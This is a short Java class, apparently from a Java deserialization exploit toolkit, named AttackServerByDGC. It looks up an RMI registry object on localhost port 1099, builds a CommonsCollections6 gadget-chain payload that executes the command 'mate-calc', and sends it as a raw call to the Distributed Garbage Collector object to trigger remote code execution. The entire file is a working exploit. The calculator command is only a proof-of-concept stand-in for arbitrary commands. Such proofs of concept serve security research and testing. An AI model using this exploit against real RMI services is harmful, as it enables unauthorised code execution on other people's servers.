package xyz.eki.marshalexp.rmi.attack;

import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.rmi.networking.RMIRegistryEndpoint;
import xyz.eki.marshalexp.rmi.networking.RemoteObjectWrapper;
import xyz.eki.marshalexp.rmi.utils.ReflectUtils;
import xyz.eki.marshalexp.rmi.utils.RemoteUtils;

import java.rmi.server.ObjID;

public class AttackServerByDGC {
    public static void main(String[] args) throws Exception {

        ReflectUtils.enableCustomRMIClassLoader();
        RMIRegistryEndpoint rmiRegistry = new RMIRegistryEndpoint("127.0.0.1", 1099);

// attack server
        RemoteObjectWrapper remoteObj = new RemoteObjectWrapper(rmiRegistry.lookup("calc"), "calc");
        Object payloadObject = new CC6().getPocObject("mate-calc");


        ObjID objID = new ObjID(2);
        RemoteUtils.sendRawCall(remoteObj.getHost(), remoteObj.getPort(), objID, 0, -669196253586618813L, payloadObject);
    }
}
